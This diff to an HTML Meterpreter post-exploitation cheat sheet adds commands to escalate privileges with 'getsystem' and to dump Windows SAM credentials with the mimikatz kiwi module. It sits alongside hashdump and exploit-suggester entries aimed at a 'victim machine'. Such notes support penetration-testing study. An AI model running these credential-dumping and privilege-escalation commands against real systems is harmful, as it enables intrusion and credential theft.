@@ -42,6 +42,9 @@
                 
                 <h2>Exploit suggester </h2>
                 <ul>
+                    <p>After any exploit suggestion at least try the following to escalate privileges</p>
+                    <pre><code class="language-bash">meterpreter > getsystem</code></pre>
+                    
                     <p>Use the following plugin to detect exploits on the victim machine</p>
                     <pre><code class="language-bash">meterpreter > run post/multi/recon/local_exploit_suggester</code></pre>
                 </ul>
@@ -80,6 +83,11 @@ exploit exploit -j -z</code></pre>
                 <ul>
                 <p>The hashdump post module will dump the contents of the SAM database.</p>
                 <pre><code class="language-bash">meterpreter > run post/windows/gather/hashdump</code></pre>
+                <p>In case you would like lsass.dmp you could always import kiwi module from mimikatz. It's worth looking at help since there are some additional commands which may come handy in case lsass don't give you anythin useful</p>
+                <pre><code class="language-bash">meterpreter > load kiwi
+meterpreter > lsa_dump_sam</code></pre> 
+                
+                
                 </ul>
 
                 <h2>Webcam list</h2>
